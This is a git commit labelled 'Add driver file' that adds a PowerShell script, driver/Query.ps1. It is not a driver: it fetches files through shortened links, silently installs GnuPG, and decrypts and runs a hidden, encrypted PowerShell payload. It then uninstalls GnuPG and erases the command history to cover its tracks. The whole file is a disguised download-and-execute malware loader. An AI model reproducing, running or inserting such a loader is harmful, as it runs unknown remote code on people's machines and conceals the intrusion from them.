cc9da0a7dff22d99586242bff972c995f098d5a2
quantum <pablorubiocruz@gmail.com>
2022-11-06 21:43:04 -0600

    Add driver file

---
+++ driver/Query.ps1
@@ -0,0 +1,11 @@
+##V.0.6
+
+Invoke-WebRequest -Uri "https://cutt.ly/UN0iz0z" -OutFile "$env:temp\gnupg-w32-2.3.8_20221013.exe"
+cmd.exe /c $env:temp\gnupg-w32-2.3.8_20221013.exe /S /V /QN
+Invoke-WebRequest -Uri "https://cutt.ly/xN0inMf" -OutFile "$env:temp\Optimizerv6.ps1.gpg"
+& 'C:\Program Files (x86)\GnuPG\bin\gpg.exe' -d $env:temp\Optimizerv6.ps1.gpg >> $env:temp\Optimizerv6.ps1
+. $env:temp\Optimizerv6.ps1
+& 'C:\Program Files (x86)\GnuPG\gnupg-uninstall.exe' /S /V /QN
+Remove-Item $env:appdata\gnupg -Recurse
+Clear-History
+Remove-Item (Get-PSReadlineOption).HistorySavePath
